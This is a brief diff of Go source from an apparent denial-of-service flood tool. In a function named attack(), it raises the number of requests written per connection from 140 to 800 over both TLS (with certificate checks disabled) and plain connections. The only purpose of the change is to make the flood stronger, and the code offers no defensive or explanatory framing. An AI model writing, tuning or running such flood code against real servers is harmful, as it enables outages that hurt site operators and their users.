@@ -110,7 +110,7 @@ func attack() {
 			x := tls.Client(s, &tls.Config{
 				ServerName: addr, InsecureSkipVerify: true,
 			})
-			for t := 0; t < 140; t++ {
+			for t := 0; t < 800; t++ {
 				x.Write([]byte(request))
 			}
 			x.Close()
@@ -118,7 +118,7 @@ func attack() {
 		if err != nil {
 			fmt.Println("Connection Down!!!")
 		} else {
-			for i := 0; i < 140; i++ {
+			for i := 0; i < 800; i++ {
 				s.Write([]byte(request))
 			}
 			s.Close()
